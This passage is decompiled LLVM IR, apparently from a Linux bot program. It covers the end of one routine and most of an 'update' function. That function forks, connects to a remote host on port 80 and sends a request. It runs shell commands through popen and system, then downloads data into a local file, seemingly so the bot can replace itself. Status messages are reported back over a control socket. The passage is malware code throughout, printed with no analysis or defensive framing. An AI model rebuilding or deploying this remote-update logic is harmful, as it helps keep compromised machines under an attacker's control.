  %v3_8053161 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_806a6cb.481 to i32))
  br label %dec_label_pc_8053181

dec_label_pc_805316b:                             ; preds = %dec_label_pc_8053108
  %v3_8053179 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_806a6e9.482 to i32))
  br label %dec_label_pc_8053181

dec_label_pc_8053181:                             ; preds = %dec_label_pc_805310e, %dec_label_pc_805316b
  %v1_8053186 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_805318b

dec_label_pc_805318b:                             ; preds = %entry, %dec_label_pc_8053181
  %v0_805318c = phi i32 [ %v1_80530f8, %entry ], [ %v1_8053186, %dec_label_pc_8053181 ]
  ret i32 %v0_805318c

; uselistorder directives
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805318b, { 1, 0 }
  uselistorder label %dec_label_pc_8053181, { 1, 0 }
}

define i32 @update(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-5228 = alloca i32, align 4
  %stack_var_-1132 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-5260 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8053191 = load i32, i32* @esi, align 4
  store i32 %v0_8053191, i32* %stack_var_-12, align 4
  %v2_8053192 = icmp ult i32* %stack_var_-12, inttoptr (i32 5248 to i32*)
  store i1 %v2_8053192, i1* %cf.global-to-local, align 1
  %v12_8053192 = ptrtoint i32* %stack_var_-5260 to i32
  %v1_8053198 = call i32 @__libc_getpid(i32 %v0_8053191)
  store i32 %v1_8053198, i32* @eax, align 4
  %v0_80531a0 = load i32, i32* @esp, align 4
  %v5_80531a0 = icmp ult i32 %v0_80531a0, 12
  store i1 %v5_80531a0, i1* %cf.global-to-local, align 1
  %v2_80531a6 = call i32 @mfork(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80531ae = icmp eq i32 %v2_80531a6, 0
  %v1_80531b0 = icmp eq i1 %v1_80531ae, false
  br i1 %v1_80531b0, label %dec_label_pc_8053968, label %dec_label_pc_80531b6

dec_label_pc_80531b6:                             ; preds = %entry
  %v4_80531b6 = add i32 %arg3, -1
  %v8_80531b6 = icmp eq i32 %arg3, 0
  %v9_80531b6 = sub i32 0, %arg3
  %v10_80531b6 = and i32 %arg3, %v9_80531b6
  %v11_80531b6 = icmp slt i32 %v10_80531b6, 0
  store i1 %v8_80531b6, i1* %cf.global-to-local, align 1
  %v12_80531b6 = icmp eq i32 %v4_80531b6, 0
  %v13_80531b6 = icmp slt i32 %v4_80531b6, 0
  %v3_80531ba = icmp eq i1 %v13_80531b6, %v11_80531b6
  %v4_80531ba = icmp eq i1 %v12_80531b6, false
  %v5_80531ba = and i1 %v4_80531ba, %v3_80531ba
  br i1 %v5_80531ba, label %dec_label_pc_80531dc, label %dec_label_pc_80531bc

dec_label_pc_80531bc:                             ; preds = %dec_label_pc_80531b6
  %v5_80531bc = icmp ult i32* %stack_var_-5260, inttoptr (i32 4 to i32*)
  store i1 %v5_80531bc, i1* %cf.global-to-local, align 1
  %v4_80531ca = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_806a708.483 to i32))
  %v5_80531d2 = icmp ult i32* %stack_var_-5260, inttoptr (i32 12 to i32*)
  store i1 %v5_80531d2, i1* %cf.global-to-local, align 1
  %v2_80531d7 = call i32 @__GI_exit(i32 0)
  %v0_80531dc.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80531dc

dec_label_pc_80531dc:                             ; preds = %dec_label_pc_80531b6, %dec_label_pc_80531bc
  %v0_80531dc = phi i32 [ %v0_80531dc.pre, %dec_label_pc_80531bc ], [ %v12_8053192, %dec_label_pc_80531b6 ]
  %v5_80531dc = icmp ult i32 %v0_80531dc, 4
  store i1 %v5_80531dc, i1* %cf.global-to-local, align 1
  %v5_80531e5 = call i32 @socket(i32 2, i32 1, i32 0)
  %v8_80531f0 = icmp ne i32 %v5_80531e5, -1
  store i1 %v8_80531f0, i1* %cf.global-to-local, align 1
  %v13_80531f0 = icmp eq i32 %v5_80531e5, -1
  %v1_80531f4 = icmp eq i1 %v13_80531f0, false
  br i1 %v1_80531f4, label %dec_label_pc_80531dc.dec_label_pc_8053216_crit_edge, label %dec_label_pc_80531f6

dec_label_pc_80531dc.dec_label_pc_8053216_crit_edge: ; preds = %dec_label_pc_80531dc
  br label %dec_label_pc_8053216

dec_label_pc_80531f6:                             ; preds = %dec_label_pc_80531dc
  %v5_80531f6 = icmp ult i32* %stack_var_-5260, inttoptr (i32 4 to i32*)
  store i1 %v5_80531f6, i1* %cf.global-to-local, align 1
  %v4_8053204 = call i32 @Send(i32 %arg1, i32 ptrtoint ([96 x i8]* @global_var_806a730.484 to i32))
  %v5_805320c = icmp ult i32* %stack_var_-5260, inttoptr (i32 12 to i32*)
  store i1 %v5_805320c, i1* %cf.global-to-local, align 1
  %v2_8053211 = call i32 @__GI_exit(i32 0)
  %v0_805321c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053216

dec_label_pc_8053216:                             ; preds = %dec_label_pc_80531dc.dec_label_pc_8053216_crit_edge, %dec_label_pc_80531f6
  %v0_805321c = phi i32 [ %v12_8053192, %dec_label_pc_80531dc.dec_label_pc_8053216_crit_edge ], [ %v0_805321c.pre, %dec_label_pc_80531f6 ]
  store i32 2, i32* %stack_var_-108, align 4
  %v5_805321c = icmp ult i32 %v0_805321c, 12
  store i1 %v5_805321c, i1* %cf.global-to-local, align 1
  %v2_8053221 = call i32 @htons(i32 80)
  %v1_8053230 = add i32 %arg4, 4
  %v5_8053230 = icmp ugt i32 %arg4, -5
  %v1_8053233 = inttoptr i32 %v1_8053230 to i32*
  %v2_8053233 = load i32, i32* %v1_8053233, align 4
  %v5_8053235 = icmp ult i32* %stack_var_-5260, inttoptr (i32 12 to i32*)
  store i1 %v5_8053235, i1* %cf.global-to-local, align 1
  %v2_8053239 = call i32 @inet_addr(i32 %v2_8053233)
  %v8_8053244 = icmp ne i32 %v2_8053239, -1
  store i1 %v8_8053244, i1* %cf.global-to-local, align 1
  %v13_8053244 = icmp eq i32 %v2_8053239, -1
  %v1_8053248 = icmp eq i1 %v13_8053244, false
  br i1 %v1_8053248, label %dec_label_pc_80532a6, label %dec_label_pc_805324a

dec_label_pc_805324a:                             ; preds = %dec_label_pc_8053216
  %v2_8053250 = load i32, i32* %v1_8053233, align 4
  store i1 %v5_8053235, i1* %cf.global-to-local, align 1
  %v2_8053256 = call i32 @__GI_gethostbyname(i32 %v2_8053250)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8053261 = icmp eq i32 %v2_8053256, 0
  %v1_8053265 = icmp eq i1 %v4_8053261, false
  br i1 %v1_8053265, label %dec_label_pc_8053287, label %dec_label_pc_8053267

dec_label_pc_8053267:                             ; preds = %dec_label_pc_805324a
  %v5_8053267 = icmp ult i32* %stack_var_-5260, inttoptr (i32 4 to i32*)
  store i1 %v5_8053267, i1* %cf.global-to-local, align 1
  %v4_8053275 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8068918.41 to i32))
  store i1 %v5_8053235, i1* %cf.global-to-local, align 1
  %v2_8053282 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8053287

dec_label_pc_8053287:                             ; preds = %dec_label_pc_805324a, %dec_label_pc_8053267
  %v1_805328a = add i32 %v2_8053256, 12
  %v2_805328a = inttoptr i32 %v1_805328a to i32*
  %v3_805328a = load i32, i32* %v2_805328a, align 4
  %v1_8053292 = add i32 %v2_8053256, 16
  %v2_8053292 = inttoptr i32 %v1_8053292 to i32*
  %v3_8053292 = load i32, i32* %v2_8053292, align 4
  %v1_8053295 = inttoptr i32 %v3_8053292 to i32*
  %v2_8053295 = load i32, i32* %v1_8053295, align 4
  store i32 %v2_8053295, i32* %edx.global-to-local, align 4
  %v5_805329a = icmp eq i32* %stack_var_-108, inttoptr (i32 -4 to i32*)
  store i1 %v5_805329a, i1* %cf.global-to-local, align 1
  %v15_805329a = ptrtoint i32* %stack_var_-104 to i32
  %tmp124 = bitcast i32* %stack_var_-104 to i8*
  store i32 %v15_805329a, i32* @edi, align 4
  %v1_805329f = inttoptr i32 %v2_8053295 to i8*
  store i32 %v2_8053295, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_80532a2 = call i8* @_memcpy(i8* %tmp124, i8* %v1_805329f, i32 %v3_805328a)
  br label %dec_label_pc_80532ac

dec_label_pc_80532a6:                             ; preds = %dec_label_pc_8053216
  store i32 %v2_8053239, i32* %stack_var_-104, align 4
  br label %dec_label_pc_80532ac

dec_label_pc_80532ac:                             ; preds = %dec_label_pc_8053287, %dec_label_pc_80532a6
  %v2_80532b3.pre-phi = ptrtoint i32* %stack_var_-108 to i32
  %v5_80532b6 = icmp ugt i32* %stack_var_-108, inttoptr (i32 -9 to i32*)
  store i1 %v5_80532b6, i1* %cf.global-to-local, align 1
  %tmp125 = bitcast i32* %stack_var_-100 to i8*
  %v6_80532ba = call i32 @__GI_memset(i8* %tmp125, i32 0, i32 8)
  %v5_80532c5 = icmp ult i32* %stack_var_-5260, inttoptr (i32 4 to i32*)
  store i1 %v5_80532c5, i1* %cf.global-to-local, align 1
  %v5_80532ce = call i32 @connect(i32 %v5_80531e5, i32 %v2_80532b3.pre-phi, i32 16)
  store i32 %v5_80532ce, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80532d6 = icmp eq i32 %v5_80532ce, 0
  br i1 %v1_80532d6, label %dec_label_pc_80532fa, label %dec_label_pc_80532da

dec_label_pc_80532da:                             ; preds = %dec_label_pc_80532ac
  store i1 %v5_80532c5, i1* %cf.global-to-local, align 1
  %v4_80532e8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8068940.42 to i32))
  store i1 %v5_8053235, i1* %cf.global-to-local, align 1
  %v2_80532f5 = call i32 @__GI_exit(i32 0)
  store i32 %v2_80532f5, i32* @eax, align 4
  %v0_80532fa.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80532fa

dec_label_pc_80532fa:                             ; preds = %dec_label_pc_80532ac, %dec_label_pc_80532da
  %v0_80532fa = phi i32 [ %v12_8053192, %dec_label_pc_80532ac ], [ %v0_80532fa.pre, %dec_label_pc_80532da ]
  %v5_80532fa = icmp ult i32 %v0_80532fa, 8
  store i1 %v5_80532fa, i1* %cf.global-to-local, align 1
  %v5_8053307 = call i32 @popen(i32 ptrtoint ([11 x i8]* @global_var_806a790.485 to i32), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8068ea3.83, i32 0, i32 0))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8053312 = icmp eq i32 %v5_8053307, 0
  br i1 %v4_8053312, label %dec_label_pc_8053390.preheader, label %dec_label_pc_8053318

dec_label_pc_8053318:                             ; preds = %dec_label_pc_80532fa
  store i1 %v5_80532c5, i1* %cf.global-to-local, align 1
  %v2_8053322 = ptrtoint i32* %stack_var_-1132 to i32
  %tmp127 = bitcast i32* %stack_var_-1132 to i8*
  %v6_8053329 = call i32 @__GI_memset(i8* %tmp127, i32 0, i32 1024)
  store i1 %v5_80532c5, i1* %cf.global-to-local, align 1
  %v5_8053343 = call i32 @fgets(i32 %v2_8053322, i32 1024, i32 %v5_8053307)
  %v5_805334b = icmp ult i32* %stack_var_-5260, inttoptr (i32 8 to i32*)
  store i1 %v5_805334b, i1* %cf.global-to-local, align 1
  %v5_805335a = call i32 @strstr(i32 %v2_8053322, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806a79b.486, i32 0, i32 0))
  %v1_8053362 = icmp eq i32 %v5_805335a, 0
  %v1_8053364 = icmp eq i1 %v1_8053362, false
  %. = zext i1 %v1_8053364 to i8
  store i1 %v5_8053235, i1* %cf.global-to-local, align 1
  %v2_8053376 = call i32 @pclose(i32 %v5_8053307)
  %v0_805337b = load i32, i32* @esp, align 4
  %v2_805337b = icmp ugt i32 %v0_805337b, -17
  store i1 %v2_805337b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053390.preheader

dec_label_pc_8053390.preheader:                   ; preds = %dec_label_pc_8053318, %dec_label_pc_80532fa
  %stack_var_-73.0.ph = phi i8 [ 0, %dec_label_pc_80532fa ], [ %., %dec_label_pc_8053318 ]
  %v1_8053396 = add i32 %arg4, 8
  %v5_8053396 = icmp ugt i32 %arg4, -9
  %v1_8053399 = inttoptr i32 %v1_8053396 to i32*
  br label %dec_label_pc_8053390

dec_label_pc_805338d:                             ; preds = %dec_label_pc_80533ba
  %v4_805338d = add i32 %storemerge13, 1
  br label %dec_label_pc_8053390

dec_label_pc_8053390:                             ; preds = %dec_label_pc_8053390.preheader, %dec_label_pc_805338d
  %storemerge13 = phi i32 [ %v4_805338d, %dec_label_pc_805338d ], [ 0, %dec_label_pc_8053390.preheader ]
  store i32 %storemerge13, i32* %edx.global-to-local, align 4
  store i1 %v5_8053396, i1* %cf.global-to-local, align 1
  %v2_8053399 = load i32, i32* %v1_8053399, align 4
  store i1 false, i1* @df, align 1
  %v4_80533a9 = inttoptr i32 %v2_8053399 to i8*
  store i32 %v2_8053399, i32* @edi, align 4
  %v3_80533af = call i32 @_strlen(i8* %v4_80533a9)
  %v0_80533b6 = load i32, i32* %edx.global-to-local, align 4
  %v7_80533b6 = icmp ult i32 %v0_80533b6, %v3_80533af
  store i1 %v7_80533b6, i1* %cf.global-to-local, align 1
  %v1_80533b8 = icmp eq i1 %v7_80533b6, false
  br i1 %v1_80533b8, label %dec_label_pc_80533ce, label %dec_label_pc_80533ba

dec_label_pc_80533ba:                             ; preds = %dec_label_pc_8053390
  store i1 %v5_8053396, i1* %cf.global-to-local, align 1
  %v2_80533c0 = load i32, i32* %v1_8053399, align 4
  store i32 %v2_80533c0, i32* %edx.global-to-local, align 4
  %v2_80533c5 = add i32 %v2_80533c0, %storemerge13
  %v1_80533c8 = inttoptr i32 %v2_80533c5 to i8*
  %v2_80533c8 = load i8, i8* %v1_80533c8, align 1
  %v6_80533ca = icmp ult i8 %v2_80533c8, 58
  store i1 %v6_80533ca, i1* %cf.global-to-local, align 1
  %v10_80533ca = icmp eq i8 %v2_80533c8, 58
  %v1_80533cc = icmp eq i1 %v10_80533ca, false
  br i1 %v1_80533cc, label %dec_label_pc_805338d, label %dec_label_pc_80533ce

dec_label_pc_80533ce:                             ; preds = %dec_label_pc_80533ba, %dec_label_pc_8053390
  %v2_80533d4 = load i32, i32* %v1_8053399, align 4
  store i32 %v2_80533d4, i32* %edx.global-to-local, align 4
  %v2_80533d9 = add i32 %v2_80533d4, %storemerge13
  %v1_80533dc = inttoptr i32 %v2_80533d9 to i8*
  store i8 0, i8* %v1_80533dc, align 1
  %v4_80533df = icmp eq i8 %stack_var_-73.0.ph, 0
  store i1 %v5_8053396, i1* %cf.global-to-local, align 1
  br i1 %v4_80533df, label %dec_label_pc_80533f2, label %dec_label_pc_8053404

dec_label_pc_80533f2:                             ; preds = %dec_label_pc_80533ce
  %v2_80533f8 = load i32, i32* %v1_8053399, align 4
  store i32 %v2_80533f8, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053404

dec_label_pc_8053404:                             ; preds = %dec_label_pc_80533ce, %dec_label_pc_80533f2
  store i1 %v5_8053230, i1* %cf.global-to-local, align 1
  %v4_8053418 = call i32 @Send(i32 %v5_80531e5, i32 ptrtoint ([276 x i8]* @global_var_8068968.43 to i32))
  store i1 %v5_80532c5, i1* %cf.global-to-local, align 1
  %v4_805342e = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_806a7a1.487 to i32))
  store i1 %v5_8053235, i1* %cf.global-to-local, align 1
  %v2_805343e = call i32 @system(i32 ptrtoint ([11 x i8]* @global_var_806a7bf.488 to i32))
  store i32 %v2_805343e, i32* @eax, align 4
  %v5_80536b5 = icmp ult i32* %stack_var_-5260, inttoptr (i32 8 to i32*)
  store i1 %v5_80536b5, i1* %cf.global-to-local, align 1
  br i1 %v4_80533df, label %dec_label_pc_80536b5, label %dec_label_pc_8053450

dec_label_pc_8053450:                             ; preds = %dec_label_pc_8053404
  %v4_805345d = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_806a7ca.489 to i32), i32 ptrtoint ([3 x i8]* @global_var_8068a98.45 to i32))
  %v0_8053462 = load i32, i32* @esp, align 4
  %v2_8053462 = icmp ugt i32 %v0_8053462, -17
  store i1 %v2_8053462, i1* %cf.global-to-local, align 1
  %v2_805346f = ptrtoint i32* %stack_var_-5228 to i32
  br label %dec_label_pc_8053468

dec_label_pc_8053468:                             ; preds = %dec_label_pc_8053589, %dec_label_pc_8053450
  %v6_8053479 = call i32 @recv(i32 %v5_80531e5, i32 %v2_805346f, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp129 = icmp slt i32 %v6_8053479, 1
  br i1 %tmp129, label %dec_label_pc_805359d.preheader.loopexit30, label %dec_label_pc_805348e

dec_label_pc_805348e:                             ; preds = %dec_label_pc_8053468
  %v4_805348e = add i32 %v6_8053479, -4095
  %v8_805348e = icmp ult i32 %v6_8053479, 4095
  %v9_805348e = sub i32 4094, %v6_8053479
  %v10_805348e = and i32 %v9_805348e, %v6_8053479
  %v11_805348e = icmp slt i32 %v10_805348e, 0
  store i1 %v8_805348e, i1* %cf.global-to-local, align 1
  %v12_805348e = icmp eq i32 %v4_805348e, 0
  %v13_805348e = icmp slt i32 %v4_805348e, 0
  %v3_8053495 = icmp eq i1 %v13_805348e, %v11_805348e
  %v4_8053495 = icmp eq i1 %v12_805348e, false
  %v5_8053495 = and i1 %v4_8053495, %v3_8053495
  br i1 %v5_8053495, label %dec_label_pc_80534ae.lr.ph, label %dec_label_pc_8053497

dec_label_pc_8053497:                             ; preds = %dec_label_pc_805348e
  %v0_805349a = load i32, i32* @ebp, align 4
  %v2_805349a = add i32 %v6_8053479, -5224
  %v3_805349a = add i32 %v2_805349a, %v0_805349a
  %v4_805349a = inttoptr i32 %v3_805349a to i8*
  store i8 0, i8* %v4_805349a, align 1
  br label %dec_label_pc_80534ae.lr.ph

dec_label_pc_80534ae.lr.ph:                       ; preds = %dec_label_pc_8053497, %dec_label_pc_805348e
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80534ae

dec_label_pc_80534ae:                             ; preds = %dec_label_pc_80534ae.lr.ph, %dec_label_pc_8053589
  %storemerge8196 = phi i32 [ 0, %dec_label_pc_80534ae.lr.ph ], [ %v4_8053589, %dec_label_pc_8053589 ]
  store i32 %storemerge8196, i32* %edx.global-to-local, align 4
  %v2_80534b9 = add i32 %storemerge8196, %v2_805346f
  %v7_80534b9 = icmp ult i32 %v2_80534b9, %v2_805346f
  store i1 %v7_80534b9, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_80534d6 = inttoptr i32 %v2_80534b9 to i8*
  store i32 %v2_80534b9, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8068a9b.46 to i32), i32* @edi, align 4
  %v7_80534e8 = call i32 @_strncmp(i8* %v4_80534d6, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068a9b.46, i32 0, i32 0), i32 4)
  %v8_80534e8 = urem i32 %v7_80534e8, 2
  %v9_80534e8 = icmp eq i32 %v8_80534e8, 0
  %v0_80534ea = load i1, i1* %cf.global-to-local, align 1
  %v2_80534ea = or i1 %v0_80534ea, %v9_80534e8
  %v3_80534ea = zext i1 %v2_80534ea to i32
  %v4_80534ea = load i32, i32* %edx.global-to-local, align 4
  %v5_80534ea = and i32 %v4_80534ea, -256
  %v6_80534ea = or i32 %v3_80534ea, %v5_80534ea
  %v7_80534ea = xor i32 %v6_80534ea, 1
  store i32 %v7_80534ea, i32* @edx, align 4
  %v3_80534f0 = and i32 %v7_80534e8, -256
  %v1_80534f2 = trunc i32 %v7_80534ea to i8
  %v3_80534f2 = zext i1 %v0_80534ea to i8
  %v4_80534f2 = sub nsw i8 %v1_80534f2, %v3_80534f2
  %v15_80534f2 = icmp eq i8 %v4_80534f2, 0
  %v20_80534f2 = zext i8 %v4_80534f2 to i32
  %v23_80534f2 = or i32 %v20_80534f2, %v3_80534f0
  store i32 %v23_80534f2, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80534fb = icmp eq i1 %v15_80534f2, false
  br i1 %v1_80534fb, label %dec_label_pc_8053589, label %dec_label_pc_8053501

dec_label_pc_8053501:                             ; preds = %dec_label_pc_80534ae
  %v4_8053501 = add i32 %storemerge8196, 4
  %v1_8053510 = add i32 %v4_805345d, 52
  %v2_8053510 = inttoptr i32 %v1_8053510 to i32*
  %v1_805351a = add i32 %v4_805345d, 16
  %v2_805351a = inttoptr i32 %v1_805351a to i32*
  %v1_8053520 = add i32 %v4_805345d, 28
  %v2_8053520 = inttoptr i32 %v1_8053520 to i32*
  %v10_8053582180 = icmp ult i32 %v4_8053501, %v6_8053479
  store i1 %v10_8053582180, i1* %cf.global-to-local, align 1
  %v5_8053585186 = icmp slt i32 %v4_8053501, %v6_8053479
  br i1 %v5_8053585186, label %dec_label_pc_8053507, label %dec_label_pc_805359d.preheader

dec_label_pc_8053507:                             ; preds = %dec_label_pc_8053501, %dec_label_pc_805357c
  %storemerge22.in187 = phi i32 [ %v4_805357c, %dec_label_pc_805357c ], [ %v4_8053501, %dec_label_pc_8053501 ]
  %v3_8053510 = load i32, i32* %v2_8053510, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053513 = icmp eq i32 %v3_8053510, 0
  br i1 %v1_8053513, label %dec_label_pc_8053560, label %dec_label_pc_8053517

dec_label_pc_8053517:                             ; preds = %dec_label_pc_8053507
  %v3_805351a = load i32, i32* %v2_805351a, align 4
  store i32 %v3_805351a, i32* @edx, align 4
  %v3_8053520 = load i32, i32* %v2_8053520, align 4
  %v7_8053523 = icmp ult i32 %v3_805351a, %v3_8053520
  store i1 %v7_8053523, i1* %cf.global-to-local, align 1
  %v1_8053525 = icmp eq i1 %v7_8053523, false
  br i1 %v1_8053525, label %dec_label_pc_8053542, label %dec_label_pc_8053527

dec_label_pc_8053527:                             ; preds = %dec_label_pc_8053517
  %v3_805352a = load i32, i32* %v2_805351a, align 4
  store i32 %v3_805352a, i32* %edx.global-to-local, align 4
  %v0_8053530 = load i32, i32* @ebp, align 4
  %v2_8053530 = add i32 %storemerge22.in187, -5224
  %v3_8053530 = add i32 %v2_8053530, %v0_8053530
  %v4_8053530 = inttoptr i32 %v3_8053530 to i8*
  %v5_8053530 = load i8, i8* %v4_8053530, align 1
  %v3_8053537 = inttoptr i32 %v3_805352a to i8*
  store i8 %v5_8053530, i8* %v3_8053537, align 1
  %v0_8053539 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053539 = add i32 %v0_8053539, 1
  store i32 %v1_8053539, i32* @edx, align 4
  store i32 %v1_8053539, i32* %v2_805351a, align 4
  br label %dec_label_pc_805357c

dec_label_pc_8053542:                             ; preds = %dec_label_pc_8053517
  %v0_8053545 = load i32, i32* @ebp, align 4
  %v2_8053545 = add i32 %storemerge22.in187, -5224
  %v3_8053545 = add i32 %v2_8053545, %v0_8053545
  %v4_8053545 = inttoptr i32 %v3_8053545 to i8*
  %v5_8053545 = load i8, i8* %v4_8053545, align 1
  %v0_805354f = load i32, i32* @esp, align 4
  %v5_805354f = icmp ult i32 %v0_805354f, 8
  store i1 %v5_805354f, i1* %cf.global-to-local, align 1
  %v5_8053556 = call i32 @putc_unlocked(i8 %v5_8053545, i32 %v4_805345d)
  %v0_805355b = load i32, i32* @esp, align 4
  %v2_805355b = icmp ugt i32 %v0_805355b, -17
  store i1 %v2_805355b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_805357c

dec_label_pc_8053560:                             ; preds = %dec_label_pc_8053507
  %v0_8053563 = load i32, i32* @ebp, align 4
  %v2_8053563 = add i32 %storemerge22.in187, -5224
  %v3_8053563 = add i32 %v2_8053563, %v0_8053563
  %v4_8053563 = inttoptr i32 %v3_8053563 to i8*
  %v5_8053563 = load i8, i8* %v4_8053563, align 1
  %v0_805356d = load i32, i32* @esp, align 4
  %v5_805356d = icmp ult i32 %v0_805356d, 8
  store i1 %v5_805356d, i1* %cf.global-to-local, align 1
  %v5_8053574 = call i32 @__GI_fputc(i8 %v5_8053563, i32 %v4_805345d)
  %v0_8053579 = load i32, i32* @esp, align 4
  %v2_8053579 = icmp ugt i32 %v0_8053579, -17
  store i1 %v2_8053579, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_805357c

dec_label_pc_805357c:                             ; preds = %dec_label_pc_8053542, %dec_label_pc_8053527, %dec_label_pc_8053560
  %v4_805357c = add i32 %storemerge22.in187, 1
  %v10_8053582 = icmp ult i32 %v4_805357c, %v6_8053479
  store i1 %v10_8053582, i1* %cf.global-to-local, align 1
  %exitcond203 = icmp eq i32 %v4_805357c, %v6_8053479
  br i1 %exitcond203, label %dec_label_pc_805359d.preheader, label %dec_label_pc_8053507

dec_label_pc_805359d.preheader.loopexit30:        ; preds = %dec_label_pc_8053468
  %.pre59 = add i32 %v4_805345d, 52
  %.pre60 = inttoptr i32 %.pre59 to i32*
  %.pre62 = add i32 %v4_805345d, 16
  %.pre63 = inttoptr i32 %.pre62 to i32*
  %.pre64 = add i32 %v4_805345d, 28
  %.pre65 = inttoptr i32 %.pre64 to i32*
  br label %dec_label_pc_805359d.preheader

dec_label_pc_805359d.preheader:                   ; preds = %dec_label_pc_8053501, %dec_label_pc_805357c, %dec_label_pc_805359d.preheader.loopexit30
  %v2_80535f9.pre-phi = phi i32* [ %.pre65, %dec_label_pc_805359d.preheader.loopexit30 ], [ %v2_8053520, %dec_label_pc_805357c ], [ %v2_8053520, %dec_label_pc_8053501 ]
  %v2_80535f3.pre-phi = phi i32* [ %.pre63, %dec_label_pc_805359d.preheader.loopexit30 ], [ %v2_805351a, %dec_label_pc_805357c ], [ %v2_805351a, %dec_label_pc_8053501 ]
  %v2_80535e9.pre-phi = phi i32* [ %.pre60, %dec_label_pc_805359d.preheader.loopexit30 ], [ %v2_8053510, %dec_label_pc_805357c ], [ %v2_8053510, %dec_label_pc_8053501 ]
  br label %dec_label_pc_805359d

dec_label_pc_8053589:                             ; preds = %dec_label_pc_80534ae
  %v4_8053589 = add nuw nsw i32 %storemerge8196, 1
  %v10_805358f = icmp ult i32 %v4_8053589, %v6_8053479
  store i1 %v10_805358f, i1* %cf.global-to-local, align 1
  %v5_8053592 = icmp slt i32 %v4_8053589, %v6_8053479
  br i1 %v5_8053592, label %dec_label_pc_80534ae, label %dec_label_pc_8053468

dec_label_pc_805359d:                             ; preds = %dec_label_pc_8053655, %dec_label_pc_805359d.preheader
  %v6_80535ae = call i32 @recv(i32 %v5_80531e5, i32 %v2_805346f, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp130 = icmp slt i32 %v6_80535ae, 1
  br i1 %tmp130, label %dec_label_pc_8053665, label %dec_label_pc_80535c3

dec_label_pc_80535c3:                             ; preds = %dec_label_pc_805359d
  %v4_80535c3 = add i32 %v6_80535ae, -4095
  %v8_80535c3 = icmp ult i32 %v6_80535ae, 4095
  %v9_80535c3 = sub i32 4094, %v6_80535ae
  %v10_80535c3 = and i32 %v9_80535c3, %v6_80535ae
  %v11_80535c3 = icmp slt i32 %v10_80535c3, 0
  store i1 %v8_80535c3, i1* %cf.global-to-local, align 1
  %v12_80535c3 = icmp eq i32 %v4_80535c3, 0
  %v13_80535c3 = icmp slt i32 %v4_80535c3, 0
  %v3_80535ca = icmp eq i1 %v13_80535c3, %v11_80535c3
  %v4_80535ca = icmp eq i1 %v12_80535c3, false
  %v5_80535ca = and i1 %v4_80535ca, %v3_80535ca
  br i1 %v5_80535ca, label %dec_label_pc_80535e0.lr.ph, label %dec_label_pc_80535cc

dec_label_pc_80535cc:                             ; preds = %dec_label_pc_80535c3
  %v0_80535cf = load i32, i32* @ebp, align 4
  %v2_80535cf = add i32 %v6_80535ae, -5224
  %v3_80535cf = add i32 %v2_80535cf, %v0_80535cf
  %v4_80535cf = inttoptr i32 %v3_80535cf to i8*
  store i8 0, i8* %v4_80535cf, align 1
  br label %dec_label_pc_80535e0.lr.ph

dec_label_pc_80535e0.lr.ph:                       ; preds = %dec_label_pc_80535cc, %dec_label_pc_80535c3
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80535e0

dec_label_pc_80535e0:                             ; preds = %dec_label_pc_8053655, %dec_label_pc_80535e0.lr.ph
  %storemerge178 = phi i32 [ 0, %dec_label_pc_80535e0.lr.ph ], [ %v4_8053655, %dec_label_pc_8053655 ]
  %v3_80535e9 = load i32, i32* %v2_80535e9.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80535ec = icmp eq i32 %v3_80535e9, 0
  br i1 %v1_80535ec, label %dec_label_pc_8053639, label %dec_label_pc_80535f0

dec_label_pc_80535f0:                             ; preds = %dec_label_pc_80535e0
  %v3_80535f3 = load i32, i32* %v2_80535f3.pre-phi, align 4
  store i32 %v3_80535f3, i32* @edx, align 4
  %v3_80535f9 = load i32, i32* %v2_80535f9.pre-phi, align 4
  %v7_80535fc = icmp ult i32 %v3_80535f3, %v3_80535f9
  store i1 %v7_80535fc, i1* %cf.global-to-local, align 1
